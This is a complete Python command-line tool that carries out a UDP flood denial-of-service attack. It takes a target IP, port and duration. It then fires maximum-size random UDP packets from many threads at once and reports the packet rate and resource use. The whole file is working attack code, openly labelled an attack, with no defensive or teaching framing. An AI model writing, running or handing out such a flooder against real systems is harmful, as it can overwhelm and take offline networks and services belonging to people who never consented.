import socket
import random
import time
import sys
import threading
import multiprocessing
import psutil
from argparse import ArgumentParser

class UDPFlooder:
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        # Optimize packet size for maximum throughput
        self.packet_size = 65507  # Maximum UDP packet size
        self.duration = duration
        self.sent_packets = 0
        self.running = False
        # Calculate optimal thread count based on CPU cores
        self.num_threads = multiprocessing.cpu_count() * 2

    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Set socket options for maximum performance
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            return sock
        except socket.error as e:
            print(f"Error creating socket: {e}")
            return None

    def generate_packet(self):
        return random._urandom(self.packet_size)

    def flood(self):
        sock = self.create_socket()
        if not sock:
            return

        self.running = True
        start_time = time.time()
        
        try:
            while self.running and (time.time() - start_time) < self.duration:
                try:
                    sock.sendto(self.generate_packet(), (self.target_ip, self.target_port))
                    self.sent_packets += 1
                except socket.error as e:
                    print(f"Error sending packet: {e}")
                    break
        finally:
            sock.close()
            self.running = False

    def start(self):
        threads = []
        print(f"Starting attack with {self.num_threads} threads")
        print(f"Using maximum UDP packet size: {self.packet_size} bytes")
        
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.flood)
            thread.daemon = True
            threads.append(thread)
            thread.start()

        try:
            # Monitor progress and system resources
            start_time = time.time()
            while any(t.is_alive() for t in threads):
                elapsed = time.time() - start_time
                if elapsed >= self.duration:
                    break
                time.sleep(1)
                # Get system resource usage
                cpu_percent = psutil.cpu_percent()
                memory_percent = psutil.virtual_memory().percent
                print(f"\rPackets sent: {self.sent_packets} | Elapsed: {elapsed:.1f}s | CPU: {cpu_percent}% | Memory: {memory_percent}%", end="")
        except KeyboardInterrupt:
            print("\nStopping flood...")
            self.running = False
            for thread in threads:
                thread.join()
        finally:
            print(f"\nTotal packets sent: {self.sent_packets}")
            print(f"Average packets per second: {self.sent_packets / self.duration:.2f}")

def main():
    parser = ArgumentParser(description="UDP Flooder Tool - Maximum Power Mode")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port")
    parser.add_argument("duration", type=int, help="Attack duration in seconds")

    args = parser.parse_args()

    try:
        flooder = UDPFlooder(args.target_ip, args.target_port, args.duration)
        print(f"Starting UDP flood attack on {args.target_ip}:{args.target_port}")
        print(f"Duration: {args.duration} seconds")
        print("Press Ctrl+C to stop")
        flooder.start()
    except KeyboardInterrupt:
        print("\nAttack stopped by user")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main() 
